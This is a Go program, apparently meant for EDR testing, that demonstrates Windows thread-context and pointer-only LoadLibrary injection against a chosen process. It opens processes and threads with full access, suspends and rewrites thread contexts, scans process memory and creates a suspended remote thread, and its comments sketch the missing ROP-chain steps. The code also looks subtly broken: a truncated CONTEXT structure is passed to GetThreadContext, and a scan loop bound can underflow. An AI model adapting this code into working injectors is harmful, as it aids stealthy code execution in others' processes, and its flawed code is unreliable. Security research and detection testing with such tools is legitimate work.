package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows API constants
const (
	PROCESS_ALL_ACCESS    = 0x001F0FFF
	THREAD_ALL_ACCESS     = 0x001F03FF
	MEM_COMMIT            = 0x00001000
	MEM_RESERVE           = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	CREATE_SUSPENDED      = 0x00000004
	CONTEXT_FULL          = 0x10007
	TH32CS_SNAPTHREAD     = 0x00000004
	TH32CS_SNAPPROCESS    = 0x00000002
)

// Define ThreadEntry32 for thread enumeration
type ThreadEntry32 struct {
	Size           uint32
	Usage          uint32
	ThreadID       uint32
	OwnerProcessID uint32
	BasePri        int32
	DeltaPri       int32
	Flags          uint32
}

// Define ProcessEntry32 for process enumeration
type ProcessEntry32 struct {
	Size              uint32
	Usage             uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	Threads           uint32
	ParentProcessID   uint32
	PriClassBase      int32
	Flags             uint32
	ExeFile           [260]uint16
}

// Define CONTEXT structure (x64)
type CONTEXT struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
	// Additional fields omitted for brevity
}

// Define relevant Windows API functions
var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modPsapi    = windows.NewLazySystemDLL("psapi.dll")
	modDbghelp  = windows.NewLazySystemDLL("dbghelp.dll")

	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = modKernel32.NewProc("Process32FirstW")
	procProcess32Next            = modKernel32.NewProc("Process32NextW")
	procThread32First            = modKernel32.NewProc("Thread32First")
	procThread32Next             = modKernel32.NewProc("Thread32Next")
	procCreateRemoteThread       = modKernel32.NewProc("CreateRemoteThread")
	procGetThreadContext         = modKernel32.NewProc("GetThreadContext")
	procSetThreadContext         = modKernel32.NewProc("SetThreadContext")
	procSuspendThread            = modKernel32.NewProc("SuspendThread")
	procResumeThread             = modKernel32.NewProc("ResumeThread")
	procGetProcAddress           = modKernel32.NewProc("GetProcAddress")
	procLoadLibrary              = modKernel32.NewProc("LoadLibraryW")
	procEnumProcessModules       = modPsapi.NewProc("EnumProcessModules")
	procGetModuleFileNameEx      = modPsapi.NewProc("GetModuleFileNameExW")
)

func main() {
	fmt.Println("Context-Only Attack Surface Techniques")
	fmt.Println("======================================")
	fmt.Println("For security research and EDR testing only")
	fmt.Println("Based on https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/")
	fmt.Println()

	// Parse command line flags
	targetProcessPtr := flag.String("process", "notepad.exe", "Target process name")
	techniquePtr := flag.Int("technique", 0, "Technique to use (1=PointerOnly, 2=AdvancedThreadContext)")
	flag.Parse()

	targetProcess := *targetProcessPtr
	technique := *techniquePtr

	// Locate target process
	fmt.Printf("[*] Targeting process: %s\n", targetProcess)
	pid := getProcessIDByName(targetProcess)

	// Start the process if not found
	if pid == 0 {
		fmt.Printf("[*] Process not found. Starting %s...\n", targetProcess)
		cmd := exec.Command(targetProcess)
		err := cmd.Start()
		if err != nil {
			fmt.Printf("[!] Error starting process: %v\n", err)
			os.Exit(1)
		}
		pid = uint32(cmd.Process.Pid)
		time.Sleep(1 * time.Second) // Give process time to initialize
	}

	fmt.Printf("[+] Target process found. PID: %d\n", pid)

	// If no technique specified, show menu
	if technique == 0 {
		technique = showMenu()
	}

	// Execute selected technique
	switch technique {
	case 1:
		fmt.Println("[*] Running Pointer-Only LoadLibrary Injection...")
		pointerOnlyLoadLibraryInjection(pid)
	case 2:
		fmt.Println("[*] Running Advanced Thread Context Manipulation...")
		advancedThreadContextManipulation(pid)
	case 3:
		fmt.Println("[*] Exiting...")
		return
	default:
		fmt.Println("[!] Invalid technique selected.")
		return
	}
}

func showMenu() int {
	var choice int
	fmt.Println("\nSelect technique to demonstrate:")
	fmt.Println("1. Pointer-Only LoadLibrary Injection")
	fmt.Println("2. Advanced Thread Context Manipulation")
	fmt.Println("3. Exit")
	fmt.Print("Choice: ")
	fmt.Scanln(&choice)
	return choice
}

// Get process ID by name
func getProcessIDByName(processName string) uint32 {
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if snapshot == uintptr(windows.InvalidHandle) {
		return 0
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0
	}

	for {
		nameBytes := make([]uint16, 260)
		for i := 0; i < 260 && entry.ExeFile[i] != 0; i++ {
			nameBytes[i] = entry.ExeFile[i]
		}
		name := windows.UTF16ToString(nameBytes)
		if name == processName {
			return entry.ProcessID
		}

		ret, _, _ = procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return 0
}

// Get main thread ID of a process
func getMainThreadID(processID uint32) uint32 {
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
	if snapshot == uintptr(windows.InvalidHandle) {
		return 0
	}
	defer windows.CloseHandle(windows.Handle(snapshot))

	var entry ThreadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0
	}

	// Find first thread of the process (often main thread)
	var threadID uint32
	for {
		if entry.OwnerProcessID == processID {
			threadID = entry.ThreadID
			break
		}

		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return threadID
}

// Find modules in a process
func findModuleInProcess(processHandle windows.Handle, moduleName string) uintptr {
	var modules [1024]windows.Handle
	var needed uint32

	// Enumerate modules in the process
	ret, _, _ := procEnumProcessModules.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(unsafe.Sizeof(modules)),
		uintptr(unsafe.Pointer(&needed)),
	)

	if ret == 0 {
		return 0
	}

	// Check each module
	numModules := needed / uint32(unsafe.Sizeof(windows.Handle(0)))
	for i := uint32(0); i < numModules; i++ {
		var modName [260]uint16
		ret, _, _ := procGetModuleFileNameEx.Call(
			uintptr(processHandle),
			uintptr(modules[i]),
			uintptr(unsafe.Pointer(&modName[0])),
			uintptr(len(modName)),
		)

		if ret != 0 {
			name := windows.UTF16ToString(modName[:])
			if len(name) >= len(moduleName) && name[len(name)-len(moduleName):] == moduleName {
				return uintptr(modules[i])
			}
		}
	}

	return 0
}

// Find LoadLibrary pointer
func findLoadLibraryPointer(processHandle windows.Handle) uintptr {
	// Find kernel32.dll in target process
	kernel32Addr := findModuleInProcess(processHandle, "kernel32.dll")
	if kernel32Addr == 0 {
		fmt.Println("[!] Failed to find kernel32.dll in target process")
		return 0
	}

	// For demonstration only - in a real attack we'd need to:
	// 1. Parse the PE headers to find the export table
	// 2. Search for LoadLibraryA/W function
	// 3. Calculate the correct address

	// This is a simplified approach that estimates the location
	// based on the current process's kernel32.dll
	localKernel32, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		fmt.Printf("[!] Error loading kernel32.dll: %v\n", err)
		return 0
	}
	defer windows.FreeLibrary(localKernel32)

	// Get local LoadLibraryA address
	localLoadLibraryAddr, err := windows.GetProcAddress(localKernel32, "LoadLibraryA")
	if err != nil {
		fmt.Printf("[!] Error getting LoadLibraryA address: %v\n", err)
		return 0
	}

	// Calculate offset of LoadLibraryA from kernel32 base
	offset := uintptr(localLoadLibraryAddr) - uintptr(localKernel32)

	// Apply offset to target process's kernel32 base
	targetLoadLibraryAddr := kernel32Addr + offset

	fmt.Printf("[+] Found kernel32.dll at 0x%x in target process\n", kernel32Addr)
	fmt.Printf("[+] Estimated LoadLibraryA at 0x%x in target process\n", targetLoadLibraryAddr)

	return targetLoadLibraryAddr
}

// Find pattern in process memory
func findInProcessMemory(processHandle windows.Handle, pattern string) uintptr {
	// Get system info for memory bounds
	var sysInfo windows.SYSTEM_INFO
	windows.GetSystemInfo(&sysInfo)

	// Scan memory for pattern
	currentAddr := sysInfo.MinimumApplicationAddress
	for currentAddr < sysInfo.MaximumApplicationAddress {
		// Query memory region
		var memInfo windows.MEMORY_BASIC_INFORMATION
		_, err := windows.VirtualQueryEx(processHandle, currentAddr, &memInfo, unsafe.Sizeof(memInfo))
		if err != nil {
			currentAddr = uintptr(unsafe.Pointer(uintptr(memInfo.BaseAddress) + uintptr(memInfo.RegionSize)))
			continue
		}

		// Check if readable memory
		if memInfo.State == windows.MEM_COMMIT &&
			(memInfo.Protect&windows.PAGE_READWRITE != 0 || memInfo.Protect&windows.PAGE_READONLY != 0) {

			// Read memory block
			buffer := make([]byte, memInfo.RegionSize)
			var bytesRead uintptr
			err := windows.ReadProcessMemory(processHandle, memInfo.BaseAddress, &buffer[0], uintptr(memInfo.RegionSize), &bytesRead)
			if err == nil && bytesRead > 0 {
				// Search for pattern
				patternBytes := []byte(pattern)
				for i := uintptr(0); i < bytesRead-uintptr(len(patternBytes)); i++ {
					found := true
					for j := 0; j < len(patternBytes); j++ {
						if buffer[i+uintptr(j)] != patternBytes[j] {
							found = false
							break
						}
					}
					if found {
						return uintptr(memInfo.BaseAddress) + i
					}
				}
			}
		}

		// Move to next region
		currentAddr = uintptr(unsafe.Pointer(uintptr(memInfo.BaseAddress) + uintptr(memInfo.RegionSize)))
	}

	return 0
}

// Pointer-Only LoadLibrary Injection Technique
func pointerOnlyLoadLibraryInjection(targetPID uint32) {
	// Open target process
	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, targetPID)
	if err != nil {
		fmt.Printf("[!] Failed to open process: %v\n", err)
		return
	}
	defer windows.CloseHandle(processHandle)

	// Get main thread ID
	threadID := getMainThreadID(targetPID)
	if threadID == 0 {
		fmt.Println("[!] Failed to find target thread")
		return
	}

	fmt.Printf("[+] Target thread ID: %d\n", threadID)

	// Open thread
	threadHandle, err := windows.OpenThread(THREAD_ALL_ACCESS, false, threadID)
	if err != nil {
		fmt.Printf("[!] Failed to open thread: %v\n", err)
		return
	}
	defer windows.CloseHandle(threadHandle)

	// Find LoadLibraryA pointer
	loadLibraryAddr := findLoadLibraryPointer(processHandle)
	if loadLibraryAddr == 0 {
		fmt.Println("[!] Failed to find LoadLibraryA")
		return
	}

	// Suspend thread
	fmt.Println("[+] Suspending thread...")
	ret, _, err := procSuspendThread.Call(uintptr(threadHandle))
	if ret == 0xFFFFFFFF {
		fmt.Printf("[!] Failed to suspend thread: %v\n", err)
		return
	}

	// Get thread context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_FULL
	
	ret, _, err = procGetThreadContext.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&ctx)),
	)
	
	if ret == 0 {
		fmt.Printf("[!] Failed to get thread context: %v\n", err)
		// Resume thread and return
		procResumeThread.Call(uintptr(threadHandle))
		return
	}

	// Store original values to restore later
	originalRip := ctx.Rip
	originalRcx := ctx.Rcx
	originalRax := ctx.Rax
	originalRsp := ctx.Rsp
	
	fmt.Printf("[+] Thread context - RIP: 0x%x, RSP: 0x%x\n", ctx.Rip, ctx.Rsp)

	// For pointer-only injection, we need to find a string in memory to use
	// First, look for "kernel32.dll" as an example
	dllName := "kernel32.dll"
	dllNameAddr := findInProcessMemory(processHandle, dllName)
	
	if dllNameAddr == 0 {
		fmt.Printf("[!] Failed to find string '%s' in process memory\n", dllName)
		// Try another common DLL name
		dllName = "ntdll.dll"
		dllNameAddr = findInProcessMemory(processHandle, dllName)
		
		if dllNameAddr == 0 {
			fmt.Println("[!] Failed to find DLL name string in process memory")
			// Restore thread
			procResumeThread.Call(uintptr(threadHandle))
			return
		}
	}
	
	fmt.Printf("[+] Found string '%s' at 0x%x\n", dllName, dllNameAddr)

	// Setup for call to LoadLibraryA(dllNameAddr)
	// For x64 calling convention, first parameter is in RCX
	ctx.Rcx = uint64(dllNameAddr)
	ctx.Rip = uint64(loadLibraryAddr)
	
	// In a real attack, we would:
	// 1. Setup a proper stack with a return address that's safe
	// 2. Create a ROP chain for multiple calls
	// 3. Use existing in-memory strings

	fmt.Println("[+] Setting up thread context for LoadLibrary call...")
	fmt.Printf("[+] LoadLibraryA: 0x%x, String: 0x%x (%s)\n", loadLibraryAddr, dllNameAddr, dllName)
	
	// For demonstration - this shows the concept without actually executing it
	fmt.Println("[!] This is a demonstration only - not executing the modified context")
	fmt.Println("[+] This technique should trigger EDR alerts for thread context manipulation")
	
	// Restore original context to prevent crashes
	ctx.Rip = originalRip
	ctx.Rcx = originalRcx
	ctx.Rax = originalRax
	ctx.Rsp = originalRsp
	
	// Set the restored context
	ret, _, err = procSetThreadContext.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&ctx)),
	)
	
	if ret == 0 {
		fmt.Printf("[!] Failed to restore thread context: %v\n", err)
	}
	
	// Resume thread
	fmt.Println("[+] Resuming thread...")
	procResumeThread.Call(uintptr(threadHandle))
	
	fmt.Println("[+] Pointer-Only LoadLibrary technique demonstration complete")
}

// Advanced Thread Context Manipulation Technique
func advancedThreadContextManipulation(targetPID uint32) {
	// Open target process
	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, targetPID)
	if err != nil {
		fmt.Printf("[!] Failed to open process: %v\n", err)
		return
	}
	defer windows.CloseHandle(processHandle)

	// Find LoadLibraryA for demonstration
	loadLibraryAddr := findLoadLibraryPointer(processHandle)
	if loadLibraryAddr == 0 {
		fmt.Println("[!] Failed to find LoadLibraryA")
		return
	}

	// Create a suspended remote thread
	fmt.Println("[+] Creating suspended remote thread...")
	var threadID uint32
	ret, _, err := procCreateRemoteThread.Call(
		uintptr(processHandle),
		0,
		0,
		loadLibraryAddr,
		0,
		CREATE_SUSPENDED,
		uintptr(unsafe.Pointer(&threadID)),
	)
	
	if ret == 0 {
		fmt.Printf("[!] Failed to create remote thread: %v\n", err)
		return
	}
	
	threadHandle := windows.Handle(ret)
	defer windows.CloseHandle(threadHandle)
	
	fmt.Printf("[+] Created suspended remote thread: %d\n", threadID)
	
	// Get thread context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_FULL
	
	ret, _, err = procGetThreadContext.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&ctx)),
	)
	
	if ret == 0 {
		fmt.Printf("[!] Failed to get thread context: %v\n", err)
		return
	}
	
	// Store original values
	originalRip := ctx.Rip
	originalRsp := ctx.Rsp
	originalRcx := ctx.Rcx
	
	fmt.Printf("[+] Thread context - RIP: 0x%x, RSP: 0x%x\n", ctx.Rip, ctx.Rsp)
	
	// Demonstrate thread stack borrowing
	fmt.Println("[+] Demonstrating thread stack borrowing...")
	borrowedStack := ctx.Rsp - 0x100 // 256 bytes below current RSP
	fmt.Printf("[+] Original RSP: 0x%x\n", ctx.Rsp)
	fmt.Printf("[+] Borrowed stack area: 0x%x\n", borrowedStack)
	
	// Demonstrate ROP gadget approach
	fmt.Println("[+] Demonstrating ROP gadget concept...")
	fmt.Println("[+] In a real attack, we would:")
	fmt.Println("    1. Find gadgets like 'pop rcx; ret' in existing code")
	fmt.Println("    2. Build a chain of return addresses on the stack")
	fmt.Println("    3. Control execution flow without allocating memory")
	
	// Find string for LoadLibrary parameter
	dllName := "kernel32.dll"
	dllNameAddr := findInProcessMemory(processHandle, dllName)
	
	if dllNameAddr != 0 {
		fmt.Printf("[+] Found string '%s' at 0x%x\n", dllName, dllNameAddr)
		fmt.Printf("[+] This could be used as parameter without allocating memory\n")
	}
	
	// In a real attack, we would:
	// 1. Set up a ROP chain on the borrowed stack
	// 2. Set RIP to the first gadget
	// 3. The chain would eventually call the target function
	
	fmt.Println("[!] This is a demonstration only - not executing the modified context")
	fmt.Println("[+] This technique should trigger EDR alerts for:")
	fmt.Println("    - CreateRemoteThread operations")
	fmt.Println("    - Thread context manipulation")
	fmt.Println("    - Suspicious stack usage")
	
	// Restore original context
	ctx.Rip = originalRip
	ctx.Rsp = originalRsp
	ctx.Rcx = originalRcx
	
	// Set the restored context
	ret, _, err = procSetThreadContext.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&ctx)),
	)
	
	if ret == 0 {
		fmt.Printf("[!] Failed to restore thread context: %v\n", err)
	}
	
	// Terminate the remote thread
	windows.TerminateThread(threadHandle, 0)
	
	fmt.Println("[+] Advanced Thread Context Manipulation technique demonstration complete")
}